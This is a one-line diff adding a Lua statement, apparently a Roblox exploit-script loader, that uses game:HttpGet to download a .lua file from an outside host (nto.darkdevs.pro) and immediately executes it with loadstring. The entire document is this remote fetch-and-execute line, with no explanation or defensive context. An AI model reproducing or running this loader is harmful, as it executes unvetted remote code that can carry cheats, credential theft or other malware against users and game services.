@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://nto.darkdevs.pro/uploads/116a338afc8c4133a4d4ed32947295c0.lua',true))()
